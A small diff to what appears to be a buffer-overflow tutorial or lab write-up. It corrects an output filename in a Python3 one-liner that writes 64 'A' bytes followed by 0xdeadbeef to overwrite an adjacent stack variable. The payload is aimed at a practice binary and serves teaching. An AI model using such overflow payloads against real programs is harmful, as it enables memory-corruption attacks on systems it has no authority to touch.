@@ -63,7 +63,7 @@ We can also see that it sits right up against our `correct` variable, so we shou
 > python -c "print('A'*64 + '\xef\xbe\xad\xde')" > inp_file.txt
 ```
 > **Note:** The above works in Python2. As Python3 uses Unicode for the basic string, and `print()` expects Unicode, for Python3 use:  
-  `python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\xef\xbe\xad\xde')" > imp_file3.txt`
+  `python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\xef\xbe\xad\xde')" > inp_file.txt`
 
 If we run this and look at the stack we can now see our A characters followed by our `deadbeef`:
 
